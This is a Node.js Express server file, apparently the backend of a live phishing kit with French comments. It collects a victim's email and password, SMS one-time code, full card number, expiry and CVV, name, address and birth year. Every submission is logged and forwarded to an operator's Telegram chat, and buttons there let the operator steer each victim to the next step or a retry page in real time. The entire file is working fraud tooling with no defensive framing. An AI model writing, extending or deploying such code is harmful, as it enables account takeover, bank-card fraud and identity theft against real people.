require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
const { bot, ADMIN_CHAT_ID, saveHistory } = require('./bot');

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static(path.join(__dirname, 'public')));

console.log("🤖 Bot démarré");

// ================================================
// MÉMOIRE
// sessions[sessionId] = données utilisateur
// decisions[sessionId] = étape décidée par admin
// ================================================
const sessions = {};
const decisions = {};

// ================================================
// BOUTONS — Admin peut envoyer à N'IMPORTE quelle étape
// ================================================
function getDecisionButtons(sessionId) {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🏠 Main (Étape 1)", callback_data: `go_step1_${sessionId}` },
          { text: "📱 SMS (Étape 2)", callback_data: `go_step2_${sessionId}` }
        ],
        [
          { text: "💳 Carte (Étape 3)", callback_data: `go_step3_${sessionId}` },
          { text: "👤 Infos (Étape 4)", callback_data: `go_step4_${sessionId}` }
        ],
        [
          { text: "✅ Succès", callback_data: `go_success_${sessionId}` },
          { text: "❌ Erreur (même étape)", callback_data: `go_error_${sessionId}` }
        ]
      ]
    }
  };
}

// ================================================
// ÉTAPE 1 — Email + Mot de passe
// ================================================
app.post('/etape1', async (req, res) => {
  try {
    const { email, password } = req.body;
    const sessionId = uuidv4();

    sessions[sessionId] = { email, password, etapeActuelle: 'step1' };
    decisions[sessionId] = null;

    saveHistory({ etape: 1, email, password, sessionId, date: new Date().toISOString() });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `🔐 ÉTAPE 1 - Connexion\n📧 Email: ${email}\n🔑 Mot de passe: ${password}\n\n👇 Où envoyer l'utilisateur ?`,
      getDecisionButtons(sessionId)
    );

    res.json({ success: true, sessionId });

  } catch (error) {
    console.error('❌ Erreur étape 1:', error);
    res.status(500).json({ success: false });
  }
});

// ================================================
// ÉTAPE 2 — Code SMS
// ================================================
app.post('/etape2', async (req, res) => {
  try {
    const { smsCode, sessionId } = req.body;

    if (sessions[sessionId]) {
      sessions[sessionId].smsCode = smsCode;
      sessions[sessionId].etapeActuelle = 'step2';
    }
    decisions[sessionId] = null;

    saveHistory({ etape: 2, smsCode, sessionId, date: new Date().toISOString() });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `📱 ÉTAPE 2 - Code SMS\n🔢 Code: ${smsCode}\n\n👇 Où envoyer l'utilisateur ?`,
      getDecisionButtons(sessionId)
    );

    res.json({ success: true });

  } catch (error) {
    console.error('❌ Erreur étape 2:', error);
    res.status(500).json({ success: false });
  }
});

// ================================================
// ÉTAPE 3 — Carte bancaire
// ================================================
app.post('/etape3', async (req, res) => {
  try {
    const { cardName, cardNumber, expiry, cvv, cardBrand, sessionId } = req.body;

    if (sessions[sessionId]) {
      Object.assign(sessions[sessionId], { cardName, cardNumber, expiry, cvv, cardBrand, etapeActuelle: 'step3' });
    }
    decisions[sessionId] = null;

    saveHistory({ etape: 3, cardName, cardNumber, expiry, cvv, cardBrand, sessionId, date: new Date().toISOString() });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `💳 ÉTAPE 3 - Carte\n🏦 Marque: ${cardBrand}\n👤 Nom: ${cardName}\n💳 Numéro: ${cardNumber}\n📅 Expiry: ${expiry}\n🔒 CVV: ${cvv}\n\n👇 Où envoyer l'utilisateur ?`,
      getDecisionButtons(sessionId)
    );

    res.json({ success: true });

  } catch (error) {
    console.error('❌ Erreur étape 3:', error);
    res.status(500).json({ success: false });
  }
});

// ================================================
// ÉTAPE 4 — Infos personnelles
// ================================================
app.post('/etape4', async (req, res) => {
  try {
    const { firstName, lastName, address, birthYear, postalCode, sessionId } = req.body;

    if (sessions[sessionId]) {
      Object.assign(sessions[sessionId], { firstName, lastName, address, birthYear, postalCode, etapeActuelle: 'step4' });
    }
    decisions[sessionId] = null;

    saveHistory({ etape: 4, firstName, lastName, address, birthYear, postalCode, sessionId, date: new Date().toISOString() });

    await bot.sendMessage(
      ADMIN_CHAT_ID,
      `👤 ÉTAPE 4 - Infos\n👤 Prénom: ${firstName}\n👤 Nom: ${lastName}\n🏠 Adresse: ${address}\n🎂 Naissance: ${birthYear}\n📮 Code postal: ${postalCode}\n\n👇 Où envoyer l'utilisateur ?`,
      getDecisionButtons(sessionId)
    );

    res.json({ success: true });

  } catch (error) {
    console.error('❌ Erreur étape 4:', error);
    res.status(500).json({ success: false });
  }
});

// ================================================
// DÉCISION — Site interroge toutes les 2s
// ================================================
app.get('/decision/:sessionId', (req, res) => {
  const { sessionId } = req.params;
  const decision = decisions[sessionId];

  if (decision) {
    decisions[sessionId] = null;
    res.json({ decision });
  } else {
    res.json({ decision: null });
  }
});

// ================================================
// CALLBACK — Admin clique un bouton Telegram
// ================================================
bot.on('callback_query', async (query) => {
  const data = query.data;

  if (data.startsWith('go_')) {
    const withoutGo = data.slice(3);
    const underscoreIndex = withoutGo.indexOf('_');
    const action = withoutGo.slice(0, underscoreIndex);
    const sessionId = withoutGo.slice(underscoreIndex + 1);

    // Si erreur → on remet la même étape actuelle
    if (action === 'error') {
      const etapeActuelle = sessions[sessionId]?.etapeActuelle || 'step1';
      decisions[sessionId] = etapeActuelle;
    } else {
      decisions[sessionId] = action;
      if (sessions[sessionId]) sessions[sessionId].etapeActuelle = action;
    }

    await bot.answerCallbackQuery(query.id, { text: `✅ Envoyé → ${action}` });

    await bot.editMessageReplyMarkup(
      { inline_keyboard: [] },
      { chat_id: query.message.chat.id, message_id: query.message.message_id }
    );

    const labels = {
      step1: '🏠 Main',
      step2: '📱 SMS',
      step3: '💳 Carte',
      step4: '👤 Infos',
      success: '✅ Succès',
      error: '❌ Erreur (même étape)'
    };

    await bot.sendMessage(ADMIN_CHAT_ID, `✅ Utilisateur redirigé → ${labels[action] || action}`);
  }
});

app.listen(3000, () => {
  console.log('🚀 Serveur démarré sur http://localhost:3000');
});
